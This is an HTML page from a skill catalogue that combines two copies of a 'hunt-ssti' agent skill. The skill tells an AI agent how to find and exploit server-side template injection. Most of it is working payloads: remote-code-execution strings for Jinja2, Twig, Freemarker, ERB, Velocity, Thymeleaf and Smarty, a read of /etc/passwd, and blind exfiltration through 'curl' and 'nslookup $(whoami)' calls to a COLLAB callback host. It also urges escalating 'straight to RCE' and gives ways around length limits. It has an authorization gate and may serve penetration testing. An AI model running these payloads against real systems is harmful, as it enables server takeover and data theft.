@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-ssti</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">ssti-hunt</a> / hunt-ssti</p><h1>hunt-ssti</h1><p class="meta">combined</p><p>Both copies describe the same SSTI hunting workflow (polyglot detection, engine fingerprinting, engine-specific RCE, blind/OOB detection), but each contains material steps the other lacks. The uphiago copy provides a broader engine matrix (including Velocity, Thymeleaf, Smarty, Mako) and a structured four-phase methodology with blind SSTI and chaining. The sickn33 copy adds an explicit authorization gate, an &#x27;escalate straight to RCE&#x27; priority order, form-encoded vs JSON body handling, length-constrained field techniques, and CMS template-editor specifics (query-param id, fingerprint-before-RCE). Crowning one would hide these real alternatives.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-ssti/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-ssti/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-ssti/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-ssti/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-ssti/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-ssti/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-ssti
+description: &quot;Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render.&quot;
+version: 1.2.0
+license: MIT
+category: security
+risk: offensive
+tags: [ssti, hunt, redteam, security]
+---
+
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## When to Use
+
+Use when the target has any endpoint that renders user-controlled input through a server-side template engine. SSTI is one of the fastest paths to RCE — detection is a single `{{7*7}}` and escalation typically requires one more payload. SSTI detection is reliable because template expressions evaluate BEFORE HTML encoding, so the result `49` appears in the rendered output even if the surrounding page is properly escaped.
+
+**Triggering contexts:** email templates (order confirmations, password resets, welcome emails), PDF/report generators, CMS preview features (page builder previews, theme editors), error pages that reflect user input, profile bio/name/description fields rendered by server-side templates, URL path parameters reflected in templates, and inline translation strings with interpolation.
+
+## Autonomous Testing Priority
+
+**Escalate straight to RCE — don&#x27;t stop at arithmetic detection.**
+
+Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `&lt;input value=&quot;{{7*7}}&quot;&gt;`), producing a false negative even when injection exists.
+
+**Order of attack:**
+1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
+   ```
+   {{config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()}}
+   ```
+2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
+   ```
+   Content-Type: application/x-www-form-urlencoded
+   field={{config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()}}
+   ```
+   JSON bodies are silently ignored by form-processing endpoints (`request.form[&#x27;field&#x27;]` sees nothing).
+3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}`
+4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.
+
+**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `&lt;div&gt;` or `&lt;pre&gt;`), that still counts — the format is irrelevant, the content is the evidence.
+
+## Quick Reference
+
+```bash
+# Detection polyglot — try this in EVERY user-controlled field
+{{7*7}}${7*7}#{7*7}&lt;%= 7*7 %&gt;*{7*7}
+# Expectation: 49 appears in the response (or 7777777 for Jinja2 string repetition)
+
+# Fingerprint engine
+{{7*&#x27;7&#x27;}}         # 7777777 = Jinja2 (Python), 49 = Twig (PHP)
+${7*7}            # 49 = Freemarker, Velocity, Mako (all use ${...})
+&lt;%= 7*7 %&gt;        # 49 = ERB (Ruby)
+*{7*7}            # 49 = Spring Thymeleaf
+
+# Blind RCE detection (OOB callback instead of output)
+{{ lipsum__globals__.os.popen(&#x27;nslookup $(whoami).COLLAB&#x27;).read() }}  # Jinja2
+```
+
+## Step-by-Step Hunting Methodology
+
+### Phase 1 — Detection &amp; Fingerprinting
+
+1. **Identify reflection points** — Every field where user input appears in rendered output: name fields, bio, email templates, error messages, URL parameters, search queries.
+
+2. **Send polyglot probe** — Submit `{{7*7}}${7*7}#{7*7}&lt;%= 7*7 %&gt;*{7*7}` in each candidate field. Look for `49` in the response body — this is a reliable signal because template expressions evaluate BEFORE HTML escaping.
+
+3. **Engine fingerprinting** — Once SSTI is confirmed, determine the engine:
+   - `{{7*&#x27;7&#x27;}}` → `7777777` = **Jinja2** (Python string repetition); `49` = **Twig** (PHP numeric coercion)
+   - `${7*7}` → `49` = **Freemarker/Spring/Velocity/Mako**
+   - `&lt;%= 7*7 %&gt;` → `49` = **ERB** (Ruby on Rails)
+   - `*{7*7}` → `49` = **Thymeleaf** (Spring/Java)
+   - `${7*7}` in header/cookie context → **Spring Boot** with sensitive properties via `${user.name}`
+
+4. **Error-reveal technique** — Submit an intentionally malformed expression (`{{badger` without closing braces) — the error message often reveals the engine name, framework version, and file paths.
+
+5. **Context analysis** — Determine if the injection is in HTML context, attribute context, JavaScript context, or blind (only the output is used, not reflected).
+
+### Phase 2 — Escalation to RCE
+
+Once the engine is fingerprinted, escalate using engine-specific RCE payloads:
+
+**Jinja2 (Python/Flask/Django):**
+```python
+# Basic RCE
+{{config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()}}
+
+# Class walker (if config is restricted)
+{{&#x27;&#x27;.__class__.__mro__[1].__subclasses__()}}
+
+# Blind RCE with OOB
+{{lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;curl http://COLLAB/ssti-rce&#x27;).read()}}
+
+# File read
+{{get_flashed_messages.__globals__.__builtins__.open(&#x27;/etc/passwd&#x27;).read()}}
+```
+
+**Twig (PHP/Symfony):**
+```php
+{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}
+{{_self.env.getFilter(&quot;id&quot;)}}
+
+# OOB callback
+{{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}
+{{_self.env.getFilter(&quot;curl http://COLLAB/twig-rce&quot;)}}
+```
+
+**Freemarker (Java):**
+```java
+&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${ex(&quot;id&quot;)}
+
+# OOB
+${&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;curl http://COLLAB/fm-rce&quot;)}
+```
+
+**ERB (Ruby on Rails):**
+```ruby
+&lt;%= system(&quot;id&quot;) %&gt;
+&lt;%= `id` %&gt;
+&lt;%= IO.popen(&quot;id&quot;).read() %&gt;
+```
+
+**Velocity (Java):**
+```java
+#set($str=$class.inspect(&quot;java.lang.String&quot;).split(&quot;&quot;))
+#set($rt=$class.inspect(&quot;java.lang.Runtime&quot;).getRuntime())
+$rt.exec(&quot;id&quot;)
+```
+
+**Spring Boot / Thymeleaf:**
+```java
+${T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(&quot;id&quot;)}
+```
+
+**Smarty (PHP):**
+```php
+{php}echo shell_exec(&quot;id&quot;);{/php}
+{system(&#x27;id&#x27;)}
+```
+
+### Phase 3 — Blind SSTI Detection
+
+When SSTI output isn&#x27;t reflected but the template still evaluates (email templates, PDF generation), use OOB detection:
+
+```bash
+# Jinja2 — exfil via DNS
+{{lipsum.__globals__.os.popen(&#x27;nslookup $(whoami).COLLAB&#x27;).read()}}
+
+# Twig — exfil via HTTP
+{{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}
+{{_self.env.getFilter(&quot;curl http://COLLAB/blind-ssti&quot;)}}
+
+# Freemarker — exfil via URL
+${&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(
+  &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),
+  &quot;curl http://COLLAB/blind-fm&quot;)}
+
+# ERB — exfil via open3
+&lt;%= Open3.popen3(&#x27;curl http://COLLAB/erb-blind&#x27;).read %&gt;
+```
+
+### Phase 4 — Chaining
+
+```bash
+# SSTI → RCE → internal network scan
+{{lipsum.__globals__.os.popen(&#x27;curl http://COLLAB/chain&#x27;).read()}}
+```
+
+## Length-Constrained Injection Fields
+
+When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won&#x27;t fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
+```python
+{{ &#x27;7&#x27;*7 }}                                  # detection, fits anywhere
+{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
+{{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[INDEX] (&#x27;id&#x27;,shell=True,stdout=-1).communicate() }}
+```
+The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output.
+
+## CMS / Template-Editor Forms (Authenticated)
+
+Some SSTI lives behind a logged-in template editor (CMS &quot;edit template&quot; / product-template / email-template preview). Three things break a naive attempt:
+
+1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the whole matrix and read which one evaluates:
+   ```
+   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
+   {{7*7}} → 49                      ⇒ Jinja2 / Twig
+   &lt;%= 7*7 %&gt; → 49                   ⇒ ERB (Ruby)
+   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
+   ```
+   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.
+
+2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to `POST /…/template?productId=N` with the id in the URL. The BODY carries only `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns `400 &quot;Missing product id&quot;`. So keep the id in the URL.
+
+3. **Use the `preview` action** to trigger rendering without persisting the payload.
+
+## Where to Test
+
+```
+Name/bio/description fields, email templates, invoice name, PDF generators,
+URL path parameters, search queries reflected in results, HTTP headers reflected
+```</pre>
+</body>
+</html>
